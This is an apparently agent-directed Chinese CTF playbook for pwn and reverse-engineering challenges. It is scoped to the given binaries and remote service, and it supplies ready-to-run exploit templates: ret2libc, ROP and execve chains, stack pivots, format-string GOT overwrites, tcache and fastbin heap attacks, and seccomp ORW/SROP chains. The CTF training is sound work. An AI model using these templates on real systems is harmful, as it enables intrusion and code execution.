# Binary 域 Playbook(pwn + 逆向)

**使命:本地 ELF + 远程 nc 服务,拿 `flag{...}` 立即追加写 `flags.json`(收件箱,runtime 负责提交)。**
读者是执行层 solver:判定条件写死、命令替换占位符后原样跑。配方失效 → 换表内下一行,不要微调同一条重喷。

## 0. 硬纪律与总流程(违反=事故)

- **范围 = 题目给的二进制/附件 + 给定的远程 `IP:PORT`**。不打平台、不扫其他端口/网段、不碰其他题容器。
- flag 出现在命令输出里即可(引擎自动收集),不需要任何提交动作。
- 远程连接**串行**,重连间隔 `sleep 0.3`;exp 失败至多重试 3 次,禁止无限重连循环。
- 每题独立目录 `work/<题名>/`:exp 落盘 `exp.py`(可重放),中间产物进 `tmp/`。附件(尤其 libc)先 `sha256sum` 记录。
- **本地打通 ≠ 完事:必须远程复跑拿 flag**(flag 在远程,通常 `cat flag*` 或 orw 读出)。
- 单题 30 分钟无进展 → 记失败清单(题名/已试/现象)切下一题;纯逆向题 15 分钟定不出逻辑 → 全文 grep flag 正则(§8)后放弃。

```
总流程:三板斧判型(§1)→ 解包/逆向(§2)→ 洞类分派:栈(§3)/fmt(§4)/堆(§5)
→ 本地打通(§6 调试)→ 远程复跑 → 写 flags.json(§8)
有 seccomp:控制流到手后按 §7 改 orw;纯逆向题:§2 后直接 grep flag
```

## 1. 开局三板斧(file / checksec / strings)

```bash
cd work/<题名>
file ./pwn ./libc.so.2 2>/dev/null; sha256sum ./*
checksec --file=./pwn 2>/dev/null || pwn checksec ./pwn
strings -n 6 ./pwn | head -40
strings -n 4 ./pwn | grep -aoEi 'flag\{[^}]{1,512}\}|/bin/sh|cat flag|[^ ]*flag[^ ]*\.txt' | sort -u
```
`strings` 直接出 flag 正则 → 写 flags.json(§8),本题可能白给,再确认逻辑即可。

### 1.1 file 输出 → 判型表

| file 输出特征 | 判定 | 主武器 |
|---|---|---|
| `ELF 64-bit LSB executable`(无 pie 字样) | No PIE,地址固定 0x40xxxx | gadget/plt 地址直接写死 |
| `ELF 64-bit LSB pie executable` / `shared object` | PIE 开 | 需泄漏 ELF 基址;低 12 位固定可部分覆盖 |
| `ELF 32-bit` | 32 位,地址 4 字节,参数全走栈 | `context.arch='i386'`;ROP 用 `p32` 链 |
| `statically linked` | 自带 libc,gadget 全在 binary | **不用 leak**:ROPgadget 直接拼 execve syscall(§3.3) |
| `dynamically linked` + 题目给了 libc | libc 版本已知 | ret2libc(§3.2),`libc = ELF('./给的libc')` |
| `dynamically linked` 无 libc | 远程 libc 未知 | 低 12 位比对(§3.2 末) |
| `ARM / aarch64 / MIPS` | 异架构 | §6 qemu-user + gdb-multiarch |
| 含 `interpreter /lib64/ld-linux-...` | 正常动态链接 | — |

### 1.2 checksec 输出 → 利用面判定表(逐行核对)

| 保护 | 状态 | 含义与打法 |
|---|---|---|
| Canary | enabled | 覆盖返回地址前必须先泄 canary(fmt `%p` §4 或堆 UAF show);触发即 abort 且 **__stack_chk_fail 可当 fmt 目标** |
| NX | enabled | 栈不可执行 → 不上 shellcode,走 ROP/ret2libc |
| NX | disabled(`stack: rwx`) | 直接 shellcode:`asm(shellcraft.sh())` 填溢出点 |
| PIE | enabled | 泄栈上 `0x55/0x56` 开头值定基址(§4 特征表);或只打低 2 字节部分覆盖 |
| RELRO | Full | GOT 只读 → fmt 改写目标换栈返回地址/hook/fini_array |
| RELRO | Partial | GOT 可写 → **最快赢面:fmt 或溢出改 GOT**(§4 目标表) |
| RWE 段 | 有 | `readelf -lW ./pwn \| grep RWE` 命中 → 该段可直接放 shellcode |

### 1.3 语言 / 打包识别 → 解包命令(判定特征写死)

| strings 特征 | 判定 | 处理命令 |
|---|---|---|
| `pyi-`/`PyInstaller`/`_MEIPASS`/`python3.\d` | PyInstaller 打包 | §2.3 解包链 |
| `Nuitka`/`__compiled__`/`Onefile` | Nuitka | onefile:先跑 `./pwn &` 再 `ls /tmp/onefile_*/`(自解压目录,直接翻 .so/pyc);或 `binwalk -Me ./pwn` |
| `go1\.\d+`/`go:buildid`/`main.main` | Go | 不解包;Ghidra 10+ 自动恢复 Go 函数名,直接看 `main.main`;flag 逻辑常在 main/init |
| `library/std`/`.rs` 路径/`panicked at` | Rust | 不解包;panic 消息里的 `.rs` 路径+行号辅助定位;逻辑在 main |
| `UPX!` / 节名 `UPX0/UPX1` | UPX 壳 | `upx -d -o tmp/pwn_up ./pwn`(报 NotPacked → 换 binwalk -Me);壳下特征再回本表 |
| `Zip archive`/`Java archive` | jar/apk | `jadx -d tmp/jadx ./文件`(jar/apk 都吃);apk 加 `apktool d ./app.apk -o tmp/apk`;然后 `grep -raoEi 'flag\{[^}]*\}' tmp/jadx tmp/apk` |
| `python X.Y byte-compiled` | 裸 .pyc | 直接 `uncompyle6 ./x.pyc > x.py`(3.9+ 用 decompyle3/`pycdc`) |
| `_ZNSt`/`@@GLIBC` 大量 C++ 符号 | C++ | `c++filt <符号>` 还原;逻辑同 C 看 vtable 调用 |

## 2. 逆向工作流(Ghidra headless 为主)

### 2.1 无 Ghidra 的 30 秒速览(先做,常直接定位漏洞函数)

```bash
objdump -d -M intel ./pwn | grep -E 'call.*<(gets|read|scanf|strcpy|strcat|sprintf|memcpy|system|execve|printf|puts|mprotect|open|fork)' | sort | uniq -c | sort -rn
nm ./pwn 2>/dev/null | grep -iE 'vuln|backdoor|win|gift|shell|flag|main|csu'   # 未 strip:白给函数
nm ./pwn 2>/dev/null | grep __libc_csu_init    # 存在 → glibc<2.34 编译,ret2csu 可用(§3.3)
strings -t x ./pwn | grep -E '/bin/sh|flag|sh$'  # -t x 给文件偏移,PIE 关时可当字符串地址用
```
- `nm` 命中 `backdoor`/`win` → **直接 ret 到它**(§3 模板把 system 换成该地址),不要造 /bin/sh 链。
- stripped 找 main:`objdump -d -M intel ./pwn | grep -A15 '<_start>:'`,`call __libc_start_main` 前的 `lea rdi,[rip+…]`/`mov edi,0x40xxxx` 的目标即 main。

### 2.2 Ghidra headless 一键全量反编译(标准命令,原样跑)

```bash
GHIDRA=$(find / -maxdepth 5 -name analyzeHeadless -type f 2>/dev/null | head -1)
mkdir -p tmp/gh_scripts tmp/gh_proj
cat > tmp/gh_scripts/DumpDecomp.java <<'EOF'
import ghidra.app.script.GhidraScript;
import ghidra.app.decompiler.*;
import ghidra.program.model.listing.*;
import java.io.*;
public class DumpDecomp extends GhidraScript {
    public void run() throws Exception {
        DecompInterface di = new DecompInterface(); di.openProgram(currentProgram);
        PrintWriter out = new PrintWriter(new FileWriter("decomp.c"));
        FunctionIterator it = currentProgram.getFunctionManager().getFunctions(true);
        while (it.hasNext()) {
            Function f = it.next();
            DecompileResults r = di.decompileFunction(f, 90, monitor);
            if (r.decompileCompleted())
                out.println("// ===== " + f.getName() + " @ " + f.getEntryPoint() + "\n" + r.getDecompiledFunction().getC());
        }
        out.close(); println("DONE decomp.c");
    }
}
EOF
"$GHIDRA" tmp/gh_proj proj1 -import ./pwn -scriptPath tmp/gh_scripts -postScript DumpDecomp.java -deleteProject
grep -n "// =====" decomp.c     # 函数索引;重点读 main、含 read/gets/printf 的函数
```
- 反编译质量差(花指令/OLLVM)→ 先看 §2.1 的 objdump 汇编;疑似花指令:函数开有 `xor` 混淆块/不可达跳转 → 记录后跳过细读,打动态(fuzz 输入看崩溃)。
- pyghidra 装了也可批处理(用法 `python3 -c "import pyghidra; help(pyghidra)"`),非必需,上面的 Java 路径必通。

### 2.3 PyInstaller 解包链(每步完整命令)

```bash
strings ./pwn | grep -oE 'python3\.[0-9]+' | head -1        # ① 定 Python 版本
PXY=$(find / -maxdepth 6 -name 'pyinstxtractor.py' 2>/dev/null | head -1)
python3 "$PXY" ./pwn                                         # ② 解出 pwn_extracted/
cd pwn_extracted && ls                                       # ③ 主逻辑 = 与二进制同名无后缀文件(如 `pwn`)
head -c 16 "$(find . -name '*.pyc' | head -1)" > tmp/hdr     # ④ 主文件缺 pyc 头,借同目录任一 .pyc 的前 16 字节
cat tmp/hdr pwn > pwn_fixed.pyc                              #    (py3.6 及以下头 12 字节:head -c 12)
uncompyle6 pwn_fixed.pyc > pwn_main.py 2>/dev/null || decompyle3 pwn_fixed.pyc > pwn_main.py 2>/dev/null || pycdc pwn_fixed.pyc > pwn_main.py
cd .. && grep -n -iE 'flag|get|read|open|key|password' pwn_extracted/pwn_main.py
```
- uncompyle6 报 unsupported → 直接 `strings pwn_fixed.pyc | head -50` 看字符串常量,拼逻辑。
- Nuitka/Go/Rust 无解包必要,回 §1.3 行内命令。

## 3. 栈溢出配方

### 3.0 症状 → 手法分派表(拿到崩溃/交互现象先查这里)

| 症状 | 判定 | 走 |
|---|---|---|
| 输入超长崩,rip/eip=0x6161… | 栈溢出可控返回地址 | §3.1 定偏移 → §3.2/3.3 |
| 输出里 `%p`/`%x` 被当格式符解析(打出 0x7f…/地址) | 格式化字符串 | §4 |
| 菜单含 Add/Delete/Show/Edit(或 Create/Free/Print) | 堆题 | §5 |
| 溢出可控但窗口 <24 字节(放不下 3 个 gadget) | 栈迁移 | §3.4 |
| 全保护 + 禁 execve | seccomp orw | §7 |
| 无崩溃点、纯逻辑 | 逆向 | §2,找隐藏选项/负数下标/整型溢出 |

### 3.1 偏移确定(cyclic,pwntools 全模板)

```bash
python3 -c "from pwn import *;open('tmp/pat.bin','wb').write(cyclic(400))"
gdb -q -batch ./pwn -ex 'run < tmp/pat.bin' -ex 'info registers rip rsp rbp' -ex 'x/s $rsp' 2>&1 | tail -8
# 64 位:取 $rsp 指向的 ASCII(如 'kaaa');32 位:rip 值 0x61616162,或 rip 未控时取 $esp 前 4 字节
python3 -c "from pwn import *;print(cyclic_find(b'kaaa'))"    # ← 换成实际读到的字节,输出即偏移
```
- 崩溃但寄存器无 pattern → 偏移正确但没到 ret:加大 cyclic;程序要交互喂法:`gdb -batch` 换成 exp 里 `process()` + `gdb.attach` 不可用时见 §6.2。
- 32 位经典偏移 112/140;64 位经典 72/88/104/136——绝境(无本地调试手段)按序直接试。

### 3.2 ret2libc 完整 exp 模板(本地 leak → 远程两段式,直接抄)

```python
#!/usr/bin/env python3
# python3 exp.py            = 本地调试;  python3 exp.py REMOTE  = 打远程
from pwn import *
context(arch='amd64', log_level='info')
elf  = ELF('./pwn')
libc = ELF('./libc.so.6')      # 题目给的 libc 就用给的;没给看本节末尾
OFF  = 72                      # §3.1 测出的偏移
io = remote('IP', PORT) if args.REMOTE else process('./pwn')

# ---- 段1:泄漏 libc 并回到 main/vuln 再来一轮 ----
pop_rdi = next(elf.search(asm('pop rdi; ret')))
ret     = next(elf.search(asm('ret')))                     # movaps 对齐垫片,见下方陷阱
pay = flat({OFF: [pop_rdi, elf.got['puts'], elf.plt['puts'], elf.symbols['main']]})
io.sendlineafter(b'input:', pay)                           # ← 分隔符按程序实际提示改
io.recvuntil(b'...\n')                                     # ← 先把 vuln 自身回显吃干净(§6.1 陷阱)
leak = u64(io.recvline().strip().ljust(8, b'\x00'))        # puts 泄漏:补 \x00 到 8 字节
libc.address = leak - libc.sym['puts']
success('libc base = %#x', libc.address)
assert libc.address & 0xfff == 0, 'base 未页对齐 → libc 版本不对'

# ---- 段2:ret2libc 拿 shell ----
pay = flat({OFF: [ret, pop_rdi, next(libc.search(b'/bin/sh\x00')), libc.sym['system']]})
io.sendlineafter(b'input:', pay)
io.sendline(b'cat flag* /flag* 2>/dev/null; ls /')
io.interactive()          # 或 print(io.recvall(timeout=3)) 非交互收结果
```
- **32 位**:无 pop rdi,参数跟在调用地址后:`flat({OFF: [elf.plt['puts'], elf.symbols['main'], elf.got['puts']]})`(plt→返回地址→参数),段 2 同理 `[system, main_ret任意4字节, binsh]`。
- **movaps 陷阱(写死)**:system 崩在 `movaps`/本地通远程崩 → ret 地址前垫一个裸 `ret`(模板段 2 的 `ret` 就是干这个;没有它 50% 概率崩)。
- **无 libc 文件**:泄漏 puts 低 12 位 `hex(leak & 0xfff)`,在 libc-database 里 `find puts <后3位hex>`(有则秒出);没有 → 常见版本逐个试:Ubuntu18.04=2.27、20.04=2.31、22.04=2.35、24.04=2.39,以 **libc base 低 12 位必须为 0** 验证,不齐换下一个。
- 有 `backdoor`/`win` 函数(§2.1):段 2 直接 `flat({OFF: [ret, backdoor_addr]})`,不碰 libc。

### 3.3 ROP 链构造(静态二进制 / gadget 拼装)

```bash
ROPgadget --binary ./pwn --only "pop|ret" | grep -E ': pop (rdi|rsi|rdx|rax) ; ret' | head
ROPgadget --binary ./pwn | grep -E ': syscall$|: syscall ; ret$|leave ; ret|int 0x80'
ropper --file ./pwn --search "pop rdx" 2>/dev/null | head    # ROPgadget 找不到 rdx 换 ropper
```
| 缺什么 | 判定 | 补法(写死) |
|---|---|---|
| pop rdi | 常有 | `ROPgadget --only "pop\|ret"` |
| pop rsi/r15 | `__libc_csu_init` 尾部必有 | ret2csu:见下行 |
| pop rdx | 罕见,**先试 ret2csu** | `csu_pop=__libc_csu_init+0x5a`? 不背偏移:`objdump -d` 找 `pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret` 与 `mov rdx,r13; mov rsi,r14; mov edi,r15d; call [r12+rbx*8]` 两条,rdx=r13/rdi=r15 |
| rax=59(execve) | 静态库常有 `pop rax; ret` | 没有就用 read 返回值控 rax(read 字节数=rax)或 SROP(§7) |
| /bin/sh 字符串 | `strings -t x ./pwn \| grep /bin/sh` | 偏移+加载基址(No PIE 直接 0x4xxxxx+offset);没有就 read 进 bss |

静态 execve 最小链(全部 p64):
```python
sc = flat(pop_rax, 59, pop_rdi, binsh_addr, pop_rsi, 0, pop_rdx_rbx, 0, syscall)  # pop_rdx_rbx: pop rdx; pop rbx; ret 也常见
```
判定:链打不通逐项 `gdb -batch ... -ex 'x/3gx $rsp'` 对栈,90% 是 gadget 地址抄错或对齐(垫 ret)。

### 3.4 栈迁移(溢出窗口不够时)

判定:溢出只能覆盖 saved rbp + ret(16 字节)且程序可往固定地址(bss)读入 → leave;ret 迁移。
```bash
ROPgadget --binary ./pwn | grep ': leave ; ret'
```
```python
bss = elf.bss(0x400)                      # No PIE 固定;PIE 先泄基址
# 第一轮:用程序自身的 read/菜单功能把真 ROP 链写进 bss(链首留 8 字节占位):
io.send(flat({0: b'\x00'*8, 8: [pop_rdi, binsh, system]}))    # ← 写入 bss 的内容
# 第二轮:溢出窗只发 16 字节:新 ebp=bss,ret=leave_ret
io.send(flat({OFF-8: bss, OFF: leave_ret}))
# 机制:函数尾 leave;ret → rsp=旧ebp;pop rbp(=bss);ret 到 leave_ret
# → 再 leave:rsp=bss;pop rbp(吃掉占位);ret → 执行 bss+8 起的真链
```
- 变体:溢出窗刚好够但链放不下 → `add rsp, 0x?8; ret` 跳回 buf 开头(需 buf 地址已知);窗口只 8 字节 → 一次 ret 只能跳一个 gadget,必须迁移或 SROP(§7)。

## 4. 格式化字符串

### 4.1 判型与偏移测定

判型:程序把输入直接 `printf(buf)`(无 `%s`)。证据:输入 `AAAA%p%p` 输出出现 `0x41414141`/`0x7f…`/`%n` 导致崩溃。
```python
from pwn import *
for off in range(1, 40):                       # 自动测偏移,逐连接试
    io = remote('IP', PORT) if args.REMOTE else process('./pwn')
    io.sendline(f'AAAABBBB%{off}$p'.encode())
    r = io.recvall(timeout=2); io.close()
    if b'0x42424241' in r or b'41414141' in r or b'0x4242424141414141' in r:
        print('OFFSET =', off); break
```
- 64 位注意:缓冲区若 8 字节对齐,地址在 `6$` 起;不对齐出现 `0x4242424141414141` → 地址起点为该 offset,fmtstr_payload 的 offset 要相应 +1/+2(测到的 offset 是 BBBB 所在即已含偏移)。

### 4.2 泄漏(地址特征表,先泄再写)

```python
io.sendline(f'%{off}$p.%{off+1}$p.%{off+2}$p'.encode())   # 一次倒一圈栈
```
| 栈上值特征 | 含义 | 减法 |
|---|---|---|
| `0x7fxxxxxxxxxx` | libc 地址(libc 内函数返回地址) | 对 libc.sym 里函数减偏移得 base;**base 低 12 位=0 自检** |
| `0x55xxxxxxx…`/`0x56…` | PIE ELF 基址附近 | 值 − (该栈槽对应函数的静态偏移) = base |
| 末尾 `…00`、每次重连变、非 0x7f 开头 | **canary** | exp 里覆盖返回地址时原位回填它 |
| `0x7ffd…`/`0x7ffe…` | 栈地址(环境变量区附近) | 写栈目标用 |
- 泄 GOT 内容(拿 libc):`payload = p64(elf.got['puts']) + b'|%{off}$s|'`(64 位地址带 \x00 放最前,offset 相应调整),`io.recvuntil(b'|')` 后取 6 字节 `u64(...ljust(8,b'\x00'))`。

### 4.3 任意写模板

首选 fmtstr_payload(自动算宽度,直接抄):
```python
pay = fmtstr_payload(off, {elf.got['printf']: elf.symbols['backdoor']}, write_size='byte')
# 64 位/含 \x00 的目标它自动把地址放尾部并调 offset,无需手改
io.sendlineafter(b':', pay)
```
判定可用前提:输入长度不限(payload 常达 100+ 字节)、无 `%` 过滤、`printf` 会再被调用或程序有第二读。长度受限 → 手搓 `hn` 分轮写(每连接写 2 字节,循环重连):

```python
# 手搓:第 k 轮写目标地址 addr+2k 的 16 位;fmt = b'%<n>c%<off>$hn' + p64(addr+2k)(64 位地址置尾)
# n = (want - 已打印宽度) % 0x10000;off 是 addr+2k 在栈上的参数序号(地址放尾时 = 首参起算点)
for k, want in enumerate([addr & 0xffff, (addr >> 16) & 0xffff, (addr >> 32) & 0xffff]):
    io = remote(HOST, PORT)
    fmt = f'%{want}c%{off+k}$hn'.encode()
    io.sendline(fmt.ljust(align, b'A') + p64(addr + 2*k))
    io.close(); time.sleep(0.3)
```
- 宽度太大(`%4919c` 打 4900 字符)本地没问题;远程慢就换 `hhn` 每轮写 1 字节(轮数×2)。

### 4.4 写什么 → 目标判定表(按手头资源查)

| 手头资源 / 目标 | 判定条件 | 效果 |
|---|---|---|
| printf@got → system/backdoor | RELRO Partial + 程序循环使用 printf | 下轮输入 `/bin/sh` 直接变 system("/bin/sh") |
| puts@got → one_gadget | 同上,无循环也行(退出路径再触发) | 下次 puts 调用即拿 shell |
| __stack_chk_fail@got → backdoor/空 | Canary 开且溢出会触发 canary | 检查失败不崩反而跳 backdoor |
| exit@got / fini_array[0] | 程序正常退出路径 | 退出即执行 |
| __malloc_hook/__free_hook → one_gadget/system | 已有 libc base 且 **glibc ≤ 2.33** | free_hook:free 一个内容为 `/bin/sh\0` 的 chunk → system("/bin/sh") |
| (glibc ≥ 2.34)hooks 已删除 | 判定:libc 2.34+ | 换打栈返回地址(§4.2 泄栈)或 exit handlers/FSOP——先试改栈,成功率高得多 |
| 栈返回地址 | Full RELRO 兜底:泄栈址 + %n 写 | 覆盖 vuln 的 ret 为 one_gadget |
| realloc_hook 调栈 | one_gadget constraints 差一点 | malloc_hook 填 `realloc+N`(跳过 push 序列)微调 rsp,再试各 one_gadget |

## 5. 堆题速查(菜单题:Add/Delete/Show/Edit)

### 5.1 glibc 版本判定(写死)

```bash
ldd ./pwn | grep libc                       # 有 libc 附件 → ./libc.so.6 直接跑会打印版本 banner:
./libc.so.6 2>/dev/null | head -2           # "GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.x)"
```
| glibc | 判定特征 | 可用攻击(按序试) |
|---|---|---|
| ≤2.26 | 无 tcache(leak 无 heap 也可) | fastbin dup、unsorted bin attack、House of Force(top size 可改) |
| 2.27–2.28 | tcache 无 key 字段 | **tcache dup 直接 double free**,poisoning 无校验 |
| 2.29–2.31 | tcache 带 key(检测同 chunk 二次 free) | poison 绕 key(改 key 字节)/ 打 fastbin(tcache 满 7) |
| 2.32+ | safe-linking(fd 指针异或加密) | poison 要 `fd = target ^ (chunk_addr>>12)`(§5.2) |
| ≤2.33 | hooks 存在 | __free_hook/__malloc_hook 是首选写目标 |
| 2.34+ | hooks 删除、`__libc_csu_init` 消失 | 写目标换:栈返回地址/exit_handler/stdout FSOP;优先栈 |

### 5.2 tcache poisoning(2.27+ 主武器,最小模板)

判定条件:①能 free 同大小 chunk ≥2 个;②free 后能改写其 fd(UAF show+edit / off-by-one / 越界 edit)。
```python
add(0x88, b'a'); add(0x88, b'b')      # chunk0, chunk1(大小任意,tcache 不查 size 一致性)
free(0); free(1)                      # 链:chunk1 → chunk0
leak = u64(show(1).ljust(8, b'\x00')) # show 一次:2.32+ 泄 safe-linking(=chunk1>>12);≤2.31 直接泄 chunk0 地址
edit(1, p64(target))                  # 2.27–2.31:直接写 target
edit(1, p64((leak << 12) ^ target))   # 2.32+(safe-linking):leak<<12 即 chunk1 页基址,异或 target 编码
add(0x88, b'c')                       # 取回 chunk1
add(0x88, p64(libc.sym['system']))    # ← 返回 target,立即用 edit/show 写/读目标
```
- target 选址:**有 libc** → `__free_hook`(再 free 内容为 `/bin/sh\0` 的 chunk 即 shell);**无 libc**(PIE+堆题)→ 泄堆改 `__malloc_hook` 不可行,转 §4 泄栈打返回地址。
- tcache poisoning 不需要伪造 size——**这是它优于 fastbin attack 的原因,首选**。

### 5.3 fastbin dup(≤2.26 或 tcache 填满 7 时)

判定:同一 chunk 可 free 两次(fastbin 只检查"目标 == 链头"→ A,B,A 顺序绕过);目标地址需有可匹配 size。
```python
add(0x68,'a'); add(0x68,'b'); add(0x68,'c')     # c 防止 top 合并
free(0); free(1); free(0)                        # A,B,A 通过检查
add(0x68,'d')                                    # 回 a
add(0x68, p64(hook-0x23))                        # fd 指向 __malloc_hook-0x23(那里 0x7f… 可当 0x70 的 fake size)
add(0x68,'e'); add(0x68, b'\x00'*0x13 + p64(one_gadget))
```

### 5.4 其他洞型判定表

| 功能特征 | 洞 | 打法一行 |
|---|---|---|
| read/edit 实际可写 size+1 字节 | off-by-one(任意字节) | 改后块 size 高字节造 overlapping chunk → 泄 libc + 任意写 |
| 写入多 1 个 `\0`(strncat/snprintf 截断) | off-by-null | 清下一块 prev_inuse → unlink 或 extend 合并出 overlap |
| free 后仍可 show | UAF | 直接 show 泄 libc(fd=main_arena)与 heap |
| delete 无置空/负数/超界 index | 任意 free/edit | double free 直接进 §5.2 |
| add 的 size 参数未校验(负数/巨大) | 越界 | 巨大 size 越过 top 直接 overlap |
| 全局数组存 chunk 指针 + 可改指针 | 任意地址读写 | 数组项改成目标地址 → edit/show 即任意写/读 |
| unlink 可触发(溢出改 fd/bk) | unlink | fake:`fd=&ptr-0x18, bk=&ptr-0x10`(过 `fd->bk==p && bk->fd==p` 检查)→ free 后 `ptr=&ptr-0x18` → 改 ptr[0]=任意地址 |

**泄露自检(写死)**:libc leak 必须 `leak & 0xfff` 等于 `main_arena_off & 0xfff`(main_arena ≈ `libc.sym['__malloc_hook'] + 0x10`,2.23–2.33);算出的 libc base / heap base **低 12 位必须为 0**,不齐 = 偏移用错,换(2.23 减 `main_arena+88`,2.27+ 减 `main_arena+96`)。

## 6. 远程交互与本地调试

### 6.1 pwntools remote 模板与 recvuntil 陷阱

```python
io = remote('IP', PORT)
io.recvuntil(b'>> ')            # 先吃菜单再发;分隔符以实际回显为准
io.sendlineafter(b'>> ', b'1')  # 等提示符再发,永不裸 send
```
| 症状 | 原因 | 处置(写死) |
|---|---|---|
| send 后无响应/菜单错位 | 缓冲残留没吃 | 一律 `sendlineafter`;开头 `io.clean(0.3)` 清残留 |
| recv 到半包 | TCP 分段 | 用 `recvuntil(b'固定尾')`;绝不用裸 `recv()` 收结构化数据 |
| 本地通、远程崩/无回显 | 远程 stdout 全缓冲(非 tty) | 泄露后等 `recvline(timeout=5)`;交互前 `io.sendline(b'\n')` 试探;必要时 `io.recvrepeat(1)` |
| 泄露地址只有 6 字节且尾断 | puts 按 `\x00` 截断 | `u64(io.recvline().strip().ljust(8, b'\x00'))` |
| interactive 卡死 | 段 1 残留输出混入 | `io.recvrepeat(0.5)` 先清,再 interactive |

### 6.2 本地调试(gdb.attach 不可用/headless 时的替代)

首选 **gdb batch + 输入文件**(无需终端/核心转储):
```bash
python3 -c "from pwn import *;open('tmp/in.bin','wb').write(flat({72: [0xdeadbeef]}))"
gdb -q -batch ./pwn -ex 'b *0x401234' -ex 'run < tmp/in.bin' -ex 'x/4gx $rsp' -ex 'info registers rip rsp rdi' -ex 'c' 2>&1 | tail -15
```
- 断点地址来自 objdump/反编译;`run < file` 喂静态 payload,交互式程序改用 pwntools 生成多轮输入再 `cat` 成文件喂。
- 崩溃取证(无 gdb 也行):
```bash
ulimit -c unlimited; echo 'core.%p' | sudo tee /proc/sys/kernel/core_pattern   # 改不了就跳过用 gdb 法
./pwn < tmp/pat.bin; ls core* 2>/dev/null && gdb -q ./pwn /tmp/core.* -ex 'x/s $rsp' -ex quit
```
- ASLR 干扰对照实验:`setarch -R ./pwn` 关 ASLR 跑,地址与 No PIE 静态分析直接对上。

### 6.3 异架构(ARM/MIPS/aarch64)

```bash
qemu-arm -L /usr/arm-linux-gnueabi ./pwn              # 跑(file 输出什么架构用哪个 qemu-<arch>)
qemu-arm -g 1234 -L /usr/arm-linux-gnueabi ./pwn      # 调试桩
gdb-multiarch -ex 'set architecture arm' -ex 'target remote :1234' ./pwn
```
pwntools `context.arch='arm'`;gadget 用 `ROPgadget --binary`(支持 arm);无 one_gadget → 手拼 syscall 链(arm: r7=系统调用号,`svc 0`)。

## 7. 沙箱 / 限制逃逸(seccomp)

### 7.1 seccomp 判定

```bash
seccomp-tools dump ./pwn 2>&1 | head -40
```
| dump 输出 | 判定 | 动作 |
|---|---|---|
| 无 seccomp 相关行(直接跑通) | 无沙箱 | 照 §3.2/3.3 拿 shell |
| `0x3b (execve) → KILL/ERRNO`、或 `0x142 (execveat)` 被禁 | 禁 exec | **orw(§7.2)** |
| 白名单模式(仅 open/read/write/exit 放行) | 严沙箱 | orw;mmap/mprotect 被禁则纯 syscall 链 |
| 全部 ALLOW | 判定失误(过滤在别处) | 回查 strace:`strace -f -e trace=seccomp,prctl ./pwn` |

### 7.2 ORW ROP 模板

系统调用号(写死):x64 `open=2 read=0 write=1 execve=59 openat=257 mprotect=10`;i386 `open=5 read=3 write=4 execve=11`。
```python
# 静态二进制(符号全)——用 ROP 对象,最稳:
context.arch='amd64'
rop = ROP(elf)
bss  = elf.bss(0x500) & ~0xfff
rop.call('read',  [0, bss, 0x10])            # 先把文件名读进 bss
rop.call('open',  [bss, 0, 0])               # open 返回 fd=3
rop.call('read',  [3, bss+0x100, 0x60])      # 读 flag
rop.call('write', [1, bss+0x100, 0x60])      # 打回显(fd 0/1/2 在 CTF 远程即 socket)
io.send(rop.chain()); io.send(b'flag\x00')   # 触发第一段 read 后喂文件名
print(io.recvall(timeout=5))
```
- 文件名按序试:`flag`、`flag.txt`、`/flag`、`/flag.txt`、`./flag`、`/home/ctf/flag`。
- **无回显判定**:exp 正常跑完但无输出 → stdout 被关,`write` 改 fd=2(stderr);再不行 `write(3→1)` 换成 openat+sendfile。
- 只拼得出 syscall gadget(动态二进制无符号):手拼链 `pop rdi(filename bss); pop rsi(0); pop rdx(0); pop rax(2); syscall` ×三段,或 ret2csu 补 rsi/rdx(§3.3)。
- gadget 极度稀缺 + 能控 rax → **SROP**:`frame = SigreturnFrame(); frame.rax=2; frame.rdi=bss; frame.rsi=0; frame.rip=syscall_ret`,链 = `pop rax(15) + syscall + frame`,open/read/write 三个 frame 串联(frame.rip 各自指向下一个 `pop rax; syscall`)。
- RWE 段存在(§1.2):`mprotect(bss_page, 0x1000, 7)` → `read(0, bss, n)` → 跳 bss 执行 `shellcraft.cat('flag')`。

## 8. 提交纪律

### 8.1 flag 正则(唯三,所有输出/文件里扫这三个)
```
flag\{[^}]{1,512}\}
ctf\{[^}]{1,512}\}
hack\{[^}]{1,512}\}
```
- pwn 题 flag 来自**远程** exp 输出(io.interactive / recvall 的回显);逆向题 flag 藏在文件/解包目录:`grep -raoEi 'flag\{[^}]{1,512}\}' ./ ./tmp/ ./work/ | sort -u`。
- 只交匹配原文,不做归一化;疑似变形(如 `FLAG{...}`、base64 块)也写入并标 `"note":"uncertain"`。

### 8.2 flags.json 收件箱(唯一记录通道)
- 工作目录 `flags.json`,JSON Lines 每行一个候选:
  ```json
  {"flag":"flag{...}","via":"pwn1 远程 ret2libc cat flag","correct":null}
  ```
- 只追加不重写;引擎自动刮取入库,你不需要手工搬运。
- flag 出现在输出里即被收集,继续下一题/深挖剩余 flag。

### 8.3 卡壳出口(同一题)
20 分钟无进展:① 回 §3.0 换洞类假设;② 远程行为与本地不一致 → 只信远程(§8.1 的远程优先),偏移/libc 用远程重测;③ 换 §1.3 确认是否漏了解包;④ 仍无果记失败清单切题。不要对同一入口重喷同一 payload 超 5 次——那是判定错了,不是姿势不熟练。
